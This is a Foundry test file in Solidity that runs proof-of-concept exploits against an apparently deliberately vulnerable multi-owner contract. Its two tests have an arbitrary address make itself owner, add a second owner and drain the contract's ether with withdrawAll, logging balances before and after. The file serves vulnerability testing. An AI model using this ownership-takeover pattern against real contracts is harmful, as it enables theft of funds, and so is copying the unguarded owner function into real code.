// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/multiowned_vulnerable.sol";

contract AccessControlTest is Test {
    TestContract testContract;
    address rootOwner = address(0x1);
    address attacker = address(0x2);
    address newOwnerCandidate = address(0x3);

    function setUp() public {
        vm.prank(rootOwner);
        testContract = new TestContract();
    }

    function testAnyoneCanBecomeOwner() public {
        // Deposit 1 ether to testContract from rootOwner
        vm.deal(rootOwner, 1 ether);
        console.log("--- BEFORE-Trigger Balances ---");
        vm.startPrank(rootOwner);
        (bool depositSuccess,) = payable(address(testContract)).call{value: 1 ether}("");
        require(depositSuccess, "deposit failed");
        vm.stopPrank();

        uint256 attackerBalanceBefore = attacker.balance;
        uint256 contractBalanceBefore = address(testContract).balance;
        console.log("Attacker ETH Balance Before:", attackerBalanceBefore);
        console.log("Contract ETH Balance Before:", contractBalanceBefore);

        console.log("--- Trigger: Attacker becomes owner and withdraws ---");
        // Attacker makes themselves an owner
        vm.prank(attacker);
        testContract.newOwner(attacker);

        // Attacker withdraws funds
        vm.prank(attacker);
        testContract.withdrawAll();

        console.log("--- AFTER-Trigger Balances ---");
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 contractBalanceAfter = address(testContract).balance;
        console.log("Attacker ETH Balance After:", attackerBalanceAfter);
        console.log("Contract ETH Balance After:", contractBalanceAfter);

        // Calculate stolen amount and verify exploitation
        uint256 stolenAmount = contractBalanceBefore - contractBalanceAfter;
        bool exploitationSuccessful = (stolenAmount > 0) && 
                                    (attackerBalanceAfter == attackerBalanceBefore + stolenAmount) &&
                                    (contractBalanceAfter == 0);

        if(exploitationSuccessful) {
            console.log("Vulnerability Exists: Attacker successfully became owner and withdrew funds");
        } else {
            console.log("Vulnerability not Exist: Withdrawal did not result in expected balance changes");
        }
    }

    function testNewOwnerCanAddMoreOwners() public {
        // Deposit 1 ether to testContract from rootOwner
        vm.deal(rootOwner, 1 ether);
        console.log("--- BEFORE-Trigger Balances (Candidate) ---");
        vm.startPrank(rootOwner);
        (bool depositSuccess,) = payable(address(testContract)).call{value: 1 ether}("");
        require(depositSuccess, "deposit failed");
        vm.stopPrank();

        uint256 candidateBalanceBefore = newOwnerCandidate.balance;
        uint256 contractBalanceBefore = address(testContract).balance;
        console.log("Candidate ETH Balance Before:", candidateBalanceBefore);
        console.log("Contract ETH Balance Before:", contractBalanceBefore);

        console.log("--- Trigger: Attacker adds candidate and candidate withdraws ---");
        // Attacker makes themselves owner then adds candidate
        vm.prank(attacker);
        testContract.newOwner(attacker);
        
        vm.prank(attacker);
        testContract.newOwner(newOwnerCandidate);

        // New owner candidate withdraws funds
        vm.prank(newOwnerCandidate);
        testContract.withdrawAll();

        console.log("--- AFTER-Trigger Balances (Candidate) ---");
        uint256 candidateBalanceAfter = newOwnerCandidate.balance;
        uint256 contractBalanceAfter = address(testContract).balance;
        console.log("Candidate ETH Balance After:", candidateBalanceAfter);
        console.log("Contract ETH Balance After:", contractBalanceAfter);

        // Calculate stolen amount and verify exploitation
        uint256 stolenAmount = contractBalanceBefore - contractBalanceAfter;
        bool exploitationSuccessful = (stolenAmount > 0) && 
                                    (candidateBalanceAfter == candidateBalanceBefore + stolenAmount) &&
                                    (contractBalanceAfter == 0);

        if(exploitationSuccessful) {
            console.log("Vulnerability Exists: Attacker added candidate who withdrew funds");
        } else {
            console.log("Vulnerability not Exist: Candidate withdrawal did not result in expected balance changes");
        }
    }
}